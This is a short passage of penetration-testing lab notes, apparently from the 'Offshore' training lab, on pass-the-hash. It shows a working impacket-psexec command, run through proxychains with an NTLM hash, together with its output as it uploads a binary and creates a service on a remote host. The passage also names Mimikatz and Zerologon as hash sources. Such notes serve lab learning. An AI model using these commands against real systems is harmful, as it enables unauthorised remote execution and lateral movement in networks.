- Need NTLM hashes to pass the hash

Methods used to pass the hash:
- Mimikatz
- Zerologon/secretsdump.py

### PsExec
```bash
┌──(root㉿kali)-[/home/bugs/offshore/10.10.110.123]
└─# proxychains4 impacket-psexec lab.offshore.local/Administrator@172.16.1.200 -hashes aad3b435b51404eeaad3b435b51404ee:8f6aaf1438d78c89c4636179e3ae18ea
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.12.0.dev1+20230815.164827.6e2b0c74 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.200:445  ...  OK
[*] Requesting shares on 172.16.1.200.....
[*] Found writable share ADMIN$
[*] Uploading file VyxLSZxw.exe
[*] Opening SVCManager on 172.16.1.200.....
[*] Creating service ZpLn on 172.16.1.200.....
[*] Starting service ZpLn.....
```

### WMIexec